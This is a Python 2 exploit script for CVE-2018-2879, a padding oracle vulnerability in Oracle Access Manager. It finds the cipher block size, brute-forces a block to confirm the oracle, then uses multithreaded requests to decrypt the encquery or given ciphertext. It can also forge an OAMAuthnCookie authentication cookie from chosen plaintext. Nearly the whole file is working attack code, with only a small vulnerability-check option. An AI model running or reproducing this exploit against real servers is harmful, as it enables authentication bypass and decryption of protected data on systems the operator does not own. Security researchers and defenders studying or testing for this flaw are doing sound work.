#!/usr/bin/env python
#
# Author: Stefan Broeder & Ahmad Mahfouz
# Multithreaded exploit for CVE-2018-2879
#
# For terminology of variable names (c1, c2, c1q, i2, etc.), please see article: 
# https://robertheaton.com/2013/07/29/padding-oracle-attack/

import requests 
import urllib
import sys
import os
import base64
import time
import md5
import urllib3
import binascii
import argparse
from Queue import Queue, Empty
from threading import Thread
import threading
import copy
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)
urllib3.disable_warnings(urllib3.exceptions.SNIMissingWarning)

test_url = "http://{}/?AAAAAAAAAAAAA" # Adapt to correct URL
num_threads = 10        # You can play with this value
headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'}

class Oracle:

    def __init__(self, url):
        self.url = url                                  # Full URL, decoded
        self.block_size = 0
        
    def set_eq(self, eq):
        prefix = self.url.split("encquery")[0]
        suffix = self.url.split("agentid")[1]
        self.url = prefix + "encquery=" + get_url_enc(eq + "%20agentid" + suffix)

    def get_eq(self):
        encquery = self.url.split("encquery=")[1].split("%20agentid")[0]
        return encquery

    def get_block(self, i):
        start = (i-1)*self.block_size
        end = i*self.block_size
        return self.get_binary()[start:end]

    def get_num_blocks(self):
        return len(self.get_binary())/self.block_size

    def get_binary(self):
        return get_b64_dec(get_url_dec(self.get_eq()))


class Worker(threading.Thread):
    
    def __init__(self, args):
        threading.Thread.__init__(self)
        self.args = args

    def run(self):
        padding_oracle_attack_thread(*self.args)

# HELPER FUNCTIONS

def get_url_dec(url):
    return url.replace("%2B","+").replace("%2F","/").replace("%3D","=")

def get_b64_dec(url):
    b64_decoded = base64.b64decode(url) 
    return b64_decoded

def get_url_enc(url):
    return url.replace("+","%2B").replace("/","%2F").replace("=","%3D")

def get_b64_enc(binary):
    b64_encoded = base64.b64encode(binary)
    return b64_encoded

def xor(a,b):
    return a ^ b

def p(text, print_star=True):
    if print_star:
        if text[0] == "\n":
            print "\n[*] "+text[1:]
        else: 
            print "[*] "+text
    else:
        print "\n"+text

def print_dot():
    sys.stdout.write('.')
    sys.stdout.flush()


def send_url(url):
    global headers, proxy
    try:
        response = requests.get(url, allow_redirects=False, headers=headers, verify=False)
    except requests.exceptions.RequestException as e:
        print e
        sys.exit(1)
    except requests.exceptions.ConnectionError as e2:
        # We sent too many requests, lets back off a little and try again
        p("Warning: Request rate too high for server, sleep for 1 second and try again")
        time.sleep(1)
        send_url(url)

    return response

def valid_padding(response):
    return not "System error" in response.text

# MAIN FUNCTIONS

#STAGE 1
def find_block_size():
    global test_url, args
    test_url = test_url.format(args.hostname)
    prev_enc_len = sys.maxint 
    max_tries = 16  
    for i in range(max_tries):
        p("Sending URL "+test_url+" to trigger encquery response")
        r = send_url(test_url)
        url = get_url_dec(r.headers['Location'])
        oracle = Oracle(url)

        enc_len = len(oracle.get_binary())
        p("Encquery found with length: "+str(enc_len))

        if enc_len > prev_enc_len:
            oracle.block_size = enc_len - prev_enc_len
            p("Length increased by "+str(oracle.block_size)+". This is our block size.")
            return oracle 
        else:
            prev_enc_len = enc_len
            test_url = test_url+'A'
    
    p("ERROR: Encquery looks to be not CBC encrypted", False)
    sys.exit(1)

#STAGE 2
def find_space_block(oracle):
    # Brute force the random block until it is accepted (302 response instead of 200)
    # Then we know that random block starts with space character (when decrypted)
    global num_threads

    work_queue = Queue()
    result_queue = Queue(maxsize=0)
    max_tries = 2000
    p("Sending a maximum of " + str(max_tries) + " URLs with a random block to find one that decrypts to a space at position 0")

    for i in range(max_tries):
        brute_force_block = str(bytearray(random.getrandbits(8) for _ in xrange(oracle.block_size)))
        work_queue.put(brute_force_block)

    for i in range(num_threads):
        oracle_copy = copy.deepcopy(oracle)
        threads = [Thread(target=find_space_block_thread, args=(oracle_copy, work_queue, result_queue))]
        for t in threads:
            t.start()

    work_queue.join()
    
    try:
        r = result_queue.get(block=False)
        p("Block with space character found")
        p(" >>> VULNERABLE TO PADDING ORACLE ATTACK <<<", False)
        return r 
    except Empty as e:
        p("ERROR: Unable to find a block with space character within "+str(max_tries)+" tries, aborting", False)
        sys.exit(1)

def find_space_block_thread(oracle, work_queue, result_queue):
    original_eq = oracle.get_eq()
    while True:
        # Try to get a new brute_force_block to work with
        try:
            brute_force_block = work_queue.get(block=False)
        except Empty as e:
            return

        # Inject the brute_force_block at the right place in the encquery
        n = oracle.get_num_blocks()
        valid_msg = oracle.get_binary()[:-1*oracle.block_size]
        last_2_blocks = oracle.get_block(n-1) + oracle.get_block(n)
        new_encquery_binary = valid_msg + brute_force_block + last_2_blocks
        new_encquery_b64 = get_b64_enc(new_encquery_binary)
        oracle.set_eq(new_encquery_b64)

        # Send request
        r = send_url(oracle.url)
        work_queue.task_done()
       
        # If successful, save result and empty the work_queue
        if valid_padding(r):
            result_queue.put(oracle)
            while True:
                try: 
                    work_queue.get(block=False)
                except Empty as e:
                    return
                work_queue.task_done()
        
        # Reset encquery
        oracle.set_eq(original_eq)

#STAGE 3
def decrypt_encquery(oracle):
    # Print encquery string
    p(get_b64_enc(oracle.get_binary()[:-3*oracle.block_size]), False)
    # Iterate blocks from block 2 (block 1 is IV) up to block n-3 (skip last_2_blocks and random_block)    
    decryption(oracle, 2, oracle.get_num_blocks()-3)

def decrypt_cookie(oracle, cookie_b64):
    prefix = oracle.get_binary() + get_b64_dec(cookie_b64)
    old_num_blocks = oracle.get_num_blocks()
    oracle.set_eq(get_b64_enc(prefix))
    new_num_blocks = oracle.get_num_blocks()
    decryption(oracle, old_num_blocks+2, new_num_blocks)

def decryption(oracle, start_block, end_block):
    # Decrypt using the given oracle
    global num_threads
    total_time = 0

    # Multithreading. 
    # Have a queue to add work and a queue to collect results
    # The found list is used to tell other threads that a given block-byte is already found so they can skip it
    work_queue = Queue()
    result_queue = Queue()
    found_list = [] 
    found_lock = threading.Lock()
    threads = [Worker((work_queue, found_list, found_lock, result_queue)) for i in range(num_threads)]
  
    # Initialize result arrays because we will not fill them sequentially
    intermediate_array = bytearray((oracle.get_num_blocks())*oracle.block_size)
    plaintext_array = bytearray((oracle.get_num_blocks())*oracle.block_size)

    for t in threads:
        t.start()

    # We go by byte, in reverse order. 
    # For example, if we have 4 blocks in total to decrypt, we will
    # first look for the last byte of block 1, 2, 3 and 4.
    # Once they have all been found, than we look for the second-to-last byte
    # of block 1, 2, 3 and 4, and so on till all (usually) 16 bytes have been found for each block
    for byte in reversed(range(oracle.block_size)):
        timer_start = time.time()
        
        # Create work packets. Threads are already started and waiting
        for byte_val in range(256):
            for block in range(start_block, end_block+1):
                work_queue.put((oracle, block, byte, byte_val, intermediate_array))

        # Wait until all work is done and the work queue is empty
        work_queue.join()

        # Interpret the results and calculate the plaintext for the current byte
        while not result_queue.empty():
            r_block, r_byte, r_i2_byte = result_queue.get()
            index = ((r_block-1)*oracle.block_size + r_byte)
            intermediate_array[index] = r_i2_byte
            c1_byte = bytearray(oracle.get_binary()[index-oracle.block_size])[0] 
            p_byte = xor(r_i2_byte, c1_byte)
            
            # Don't save padding bytes (assuming only ASCII characters >16)
            if r_block == end_block and p_byte <= 16:
            	continue
            	
            plaintext_array[index] = p_byte

        # Finish up
        with found_lock:
            del found_list[:]
        
        elapsed = time.time() - timer_start
        total_time += elapsed
        
        plaintext = str(plaintext_array[(start_block-1)*oracle.block_size:]).rstrip("\x00").replace("\x00","_")
        if(byte > 0):
            p("\nFound bytes on position %i for all blocks in %.2fs. Plaintext so far: \n%s" %(byte, elapsed, plaintext))

    p("Decryption completed in %.2fs. Plaintext:\n%s" %(total_time, plaintext))
    sys.exit(1)

def padding_oracle_attack_thread(work_queue, found_list, found_lock, result_queue):
    while True:
        try:
            oracle, block, byte, byte_val, intermediate_array = work_queue.get(timeout=3)
        except Empty as e:
            return

        # First check if some other thread already found the solution for this block-byte
        with found_lock:
            if (block,byte) in found_list:
                work_queue.task_done()
                continue
        
        block_size = oracle.block_size
        prefix = oracle.get_binary()
        c1q = bytearray(block_size)
        c2 = bytearray(oracle.get_block(block))
        i2 = intermediate_array[(block-1)*block_size:block*block_size]
        padding_byte = block_size - byte 


        # Set the bytes we already decrypted to the new padding_byte value
        c1q[byte] = byte_val 
        for m in range(byte+1,block_size):
            c1q[m] = xor(padding_byte, i2[m])
            
        data = prefix + str(c1q) + str(c2)
        encquery_b64 = get_b64_enc(data)

        # Create temporary oracle for new eq and send it off
        test_oracle = Oracle(oracle.url)
        test_oracle.set_eq(encquery_b64)
        r = send_url(test_oracle.url)

        # If we have valid padding we can deduce the value of i2. 
        # Put it in the result queue and let the main thread eventually calculate p2
        if valid_padding(r):
            print_dot()
            i2_byte = xor(byte_val, padding_byte)
            result_queue.put((block, byte, i2_byte))

            #Let the other threads know we found it
            with found_lock:
                found_list.append((block, byte))

        work_queue.task_done()
            
def encrypt_cookie(oracle, plaintext):
    # We use a variant of padding oracle attack as described here: https://crypto.stackexchange.com/a/50027

    # Always add padding bytes
    nr_padding_bytes = oracle.block_size-(len(plaintext)%oracle.block_size)
    if nr_padding_bytes != oracle.block_size:
        plaintext = plaintext + chr(nr_padding_bytes) * nr_padding_bytes
    else:
        plaintext = plaintext + chr(16) * 16

    # Encrypt the padded plaintext
    encryption(oracle, plaintext)

def encryption(oracle, plaintext): 
    global num_threads
    ciphertext = ""

    # Create and start our threads
    work_queue = Queue()
    result_queue = Queue()
    found_list = []
    found_lock = threading.Lock()

    threads = [Worker((work_queue, found_list, found_lock, result_queue)) for i in range(num_threads)]

    for t in threads:
        t.start()

    # C2 will be the 1 block which we append and decrypt each time
    c2 = bytearray(oracle.block_size)
    prefix = oracle.get_binary()
    prefix_len = oracle.get_num_blocks()
    c2_block_nr = prefix_len + 1
    intermediate_array = bytearray(c2_block_nr * oracle.get_num_blocks())
    nr_plaintext_blocks = len(plaintext)/oracle.block_size

    # For encryption we have to go block by block, because they all depend on each other
    for i in reversed(range(1, nr_plaintext_blocks+1)):
        p("\nFound ciphertext of block "+str(i)+" (in hex): "+binascii.hexlify(c2))
        ciphertext = c2 + ciphertext
        oracle.set_eq(get_b64_enc(prefix + c2))

        for byte in reversed(range(oracle.block_size)):
            for byte_val in range(256):
                work_queue.put((oracle, c2_block_nr, byte, byte_val, intermediate_array))

            work_queue.join()

            while not result_queue.empty():
                r_block, r_byte, r_i2_byte = result_queue.get()
                intermediate_array[(r_block-1)*oracle.block_size + r_byte] = r_i2_byte
                pj = bytearray(plaintext[(i-1)*oracle.block_size + r_byte])
                c2[r_byte] = xor(r_i2_byte, pj[0])
                print_dot()
        
        # Finish up
        with found_lock:
            del found_list[:]

    p("\nFound ciphertext of IV: "+binascii.hexlify(c2))
    ciphertext = c2 + ciphertext

    OAMAuthnCookie_enc = get_url_enc(get_b64_enc(ciphertext))
    p("Authentication cookie found:", False)
    p("OAMAuthnCookie="+str(OAMAuthnCookie_enc),False)



parser = argparse.ArgumentParser()
parser.add_argument("hostname", help="The hostname to test")
parser.add_argument("-v", "--verify", help="Verify if target is vulnerable to OAM Padding Oracle Attack", action="store_true")
parser.add_argument("-d", "--decrypt", help="Decrypt encquery string", action="store_true")
parser.add_argument("-s", "--decrypt-string", help="Decrypt given ciphertext (base64 encoded between quotes)")
parser.add_argument("-e", "--encrypt-string", help="Encrypt given plaintext (between quotes)" )
args = parser.parse_args()

p("STAGE 1 - Find block size", False)
oracle = find_block_size()
p("STAGE 2 - Brute force block to find space character", False)
oracle = find_space_block(oracle)
if(not args.verify):
    if(args.decrypt):
        p("STAGE 3 - Perform padding oracle attack to decrypt encquery: ",False)
        decrypt_encquery(oracle)
    if(args.decrypt_string):
        p("STAGE 3 - Perform padding oracle attack to decrypt given string",False)
        decrypt_cookie(oracle, args.decrypt_string)
    if(args.encrypt_string):
        p("STAGE 3 - Perform padding oracle attack to encrypt OAMAuthnCookie",False)
        encrypt_cookie(oracle, args.encrypt_string)
